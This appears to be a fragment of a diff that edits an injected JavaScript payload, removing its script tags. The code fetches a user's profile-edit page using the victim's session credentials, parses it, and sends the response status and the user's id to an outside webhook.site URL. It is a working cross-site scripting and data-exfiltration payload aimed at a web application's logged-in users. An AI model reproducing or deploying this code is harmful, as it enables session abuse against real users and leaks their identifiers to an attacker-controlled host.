@@ -1,4 +1,3 @@
-<script>
 fetch('/User/EditProfilePengguna', { credentials: 'include' })
 .then(r => r.text())
 .then(html => {
@@ -28,4 +27,3 @@ fetch('/User/EditProfilePengguna', { credentials: 'include' })
     fetch('https://webhook.site/3b7c28dc-c8e1-411f-b61e-cec5990817fc/log?status=' + r.status + '&uid=' + userId);
   });
 });
-</script>
